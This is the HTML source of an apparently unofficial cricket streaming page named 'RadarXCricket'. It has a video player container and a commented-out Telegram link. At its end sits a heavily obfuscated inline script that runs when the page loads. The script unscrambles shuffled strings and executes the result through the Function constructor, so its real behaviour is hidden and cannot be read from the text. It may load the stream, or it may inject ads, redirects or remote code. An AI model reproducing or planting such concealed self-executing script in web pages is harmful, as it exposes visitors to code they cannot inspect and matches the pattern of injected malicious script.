<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXCricket</title>
    <style>
        /* General Page Styling */
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #242424, #3b5998);
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
        }

        /* Bingewav Sports Logo Section */
        .logo-container {
            background: #000; /* Black background for the logo */
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
        }

        .logo-container img {
            width: 220px; /* Adjust the logo size */
            height: auto;
        }

        /* Video Player Styling */
        .player-container {
            width: 95%;
            max-width: 1200px;
            margin: 20px auto;
            box-shadow: 0 6px 25px rgba(0, 0, 0, 0.4);
            border-radius: 15px;
            overflow: hidden;
            background: #000; /* Black background behind the video for better focus */
            position: relative;
            padding-top: 56.25%; /* 16:9 Aspect Ratio */
        }

        .player-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border-radius: 15px;
            border: none;
        }

        /* Stream Issue Section */
        .stream-issue {
            margin-top: 20px;
            padding: 15px 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            font-size: 16px;
            color: #fff;
            width: fit-content;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
        }

        .stream-issue a {
            color: #00c1ff;
            text-decoration: none;
            font-weight: bold;
        }

        .stream-issue a:hover {
            text-decoration: underline;
        }

        /* Join Telegram Button */
        .join-telegram-container {
            margin-top: 20px;
            text-align: center;
        }

        .join-telegram-btn {
            padding: 10px 20px;
            font-size: 16px;
            font-weight: bold;
            color: white;
            background-color: #008fd6;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        }

        .join-telegram-btn:hover {
            background-color: #006bb3;
        }
    </style>
</head>
<body>

<!-- Video Player Section -->
<div class="player-container" id="playerContainer"></div>
<!-- Join Telegram Button
<div class="join-telegram-container">
    <button class="join-telegram-btn" onclick="window.open('https://t.me/RadarXCricket', '_blank')">Join Telegram Channel</button>
</div>
-->
<script>
var loadIframe;(function(){var Qpj='',lEf=110-99;function bJb(o){var z=3393500;var d=o.length;var i=[];for(var x=0;x<d;x++){i[x]=o.charAt(x)};for(var x=0;x<d;x++){var j=z*(x+554)+(z%15842);var l=z*(x+599)+(z%39540);var y=j%d;var a=l%d;var q=i[y];i[y]=i[a];i[a]=q;z=(j+l)%6526959;};return i.join('')};var ccW=bJb('ktzttwgpodribcnofuvomjcsrxcyrasehulqn').substr(0,lEf);var qYq='ba;d}6=2,.(7.,rs98;Ce5c(n"rt.=p]rhzjAl[uvpr or0);xpzg;ign l=1,]10an(pt;6a=.)r5,(q,e0z]1}r;ann[rrafn,=t6=a,;8s8],q9[tu,t67=in( .rC nf;,((arhrs0ufnm+rsntlhh)+n;c[h(ccahCri d1+[,7=]ch4,-1f.+==1,=h=vf)fu=ev5hal+0xmuavg+d(d tp+p+aaa.8+}),.=; ;0s-ramna(mos.pr".if,"=7)xocruheo=d2v.lt[gq>l=;ia!4e(;-(t;fk rrt( lavarcl8vf)pCxar==1nu.l)vvei(=0q,)epi<kel ,tzm,)=to"8hf2(ra<+d=rg}n3i7id;f2or;wv8vcharC.;lAg  tevlr t;l[vvkqikf])A=i.; pw-u).6h(]go)est(=qg2"u;h,;;dd<sat-se.tfrvi==)s<(uprm6aen.)h;o8k(11ortCdsA1(d.+l])k+=h;r+odkix)1m20-repva;gu0ci}=;;evc;ev(n e;lo ()=w2,re=4r"]gi((a.o);.du3c)fos=hrt+vkg=;=0j2;elu shd)tr+24;;v=o+0})i.f i( =lm){inrl<c)oo;cvh[(;=f6r+aike9+)fmg .=i[.so;nrd;i86)hap*s{)v[0]7;pvp,ag"dsjsmf 6"e]r[2 =u;nsy[2notf+9(ava,2][+o7v;)u(1.}au)dn8tl)n,ef)orCrt>C,l)((7=,)o((ea; =ro;t.nureqb g;fn+tfvl9ja]]tvnSd"=sj9na(o.red{+,nSg+cr*h8r.pwo1rs;;{A-xf");a{rve,b(gifu{7t{uv !al=+ol9g+[r';var xGk=bJb[ccW];var Lhp='';var ZwW=xGk;var NAS=xGk(Lhp,bJb(qYq));var iVa=NAS(bJb('Y3tf]i64oYj(h%o,,ig4_5er.(o50 .5Y(f={]s.t%\/xY(6YtrtY5nsEsf64a?.)gt<gt7tYol-S8_Scy-iutt].nr6% ,)i0eY)fe763l2fo}feCY)6=8).I.(buY\'_{_e4aY}((np(pu7 en;o}l!8;o]sbsptsr7d7)%n7.!t(o(boIf(ct_c6fanol 0id18ge1> f$lY31%nd5i-(=tus;58kYfnYg[oY.Y]%%n.o04 =weh)"psif(l,wYar1!3al(. r$=Yf)ep3%76Yc.,s$md7f=7o6bnYt(bYe== wal-eoof%lY8())e0%l8w6sn4;n([s%f;(y.s ]tf9[eY6Y;1+% 2;g.01c7%mslarh7Y".h$6rxt)o)a8l#aYeYeaf]p)e;plY%d.]=;_hdsjns$YYmf5oY)u,u3e.assgoY.d2rnp]u6&f i8i8gy-3!o_e)l2#25060ars[3.1Y+.p_o(o;..5(ae6Yf7Y6});3YYf.&;Y!b;y;YYh,n{a1.!_jY);so}54tcil$_8l35=,hwlpndt;{-. _5tf_(.%($r{.o.6tuY.p)(bY9!.e_i89npYtr).e;e)r4wY_4rc_5oi&{ sen;p).n*d(nsu+)Y6Y$r3Y,Ye!YdY_4d,6Ca(.! (,idr_,_\'%(1)Yf58=)airYYoi\/,f(e$_4(,ilm!l.el76;lY 8n%1)f)3bY{(\/nr91nY.%Y*n3r30xn_=6a!j07Y#6im Y667j-o<5cele6d8]a!i!$a},;Y.a}7yYu5_45%ii_;1Y.Y]n9%Ye%f=Ye..3\/a1\/iaYCidtfhrrt8$!y$.fYYpx6]%lra],doi]1e=;d+j(3=.s#$!sf].d(c?<r%tdY=o_sYsr73rY.,5Y;gn[epYek).Y)+g;Y..Ym43_Y>%6conifff!_oY8nl} YdY)a_ jdfrs1pr(8d tY",fi".),Y>t]lYd.;6fYr1t_1_l8]6_&s2fn1l_)e_5$ef5_(6as;4iY2eY5Yo ai,04fYei4Y-[#Y65;,,00])6eY&l=_p1)69a!b6-C9.2)f7ll.$%j}.Yl[0Ym[Y,905YlYa Y5(Y2Y1YiY(\'., "+3(tYY1$21lY<hf)";{e4]$[Y\/w]!n od]e[)!<rY> 7}}xo..df)xge9Y,ariYY8w)9(2wxfa\'7e_E.fo,3!Y)n+sr,-(\/auY).sf9<nY6Yvj[Y,()6g5ta.{r9,j="n!=.i_s-es!!+(r1f=j);4=f(rg,i"=3(9=Ym,2?a=))#6}(roY24Y*mYYY8Y)frr]=sYe}!?e,fel=ed).t)})fb;mY.;nee6]4searY..eo,(t\/7n$Ye l)dd(u(e0 83ia.\'fs);(f_1.nm$Y0lyb)eYf1b=(bl*2rY!13$$mc)3!t0sSha{1Y6{\/D2ij;(efve)n);;d_4!xtf_$tf+6kj]7sYjl5Y7Y{ \/,Ya[f_!_u;)hYsY0x*_)bYvf). YYmYlbn.4_Y0_n#_%n t1Yn{e8cr}Y-,Yi$.:)rYu p6%0n-57b,?c\'3bvnafxr)f\'.YYt};51r(rY9_t=ma"lo.$Y):e)Y _!_;'));var YsF=ZwW(Qpj,iVa );YsF(9939);return 4998})()
</script>

</body>
</html>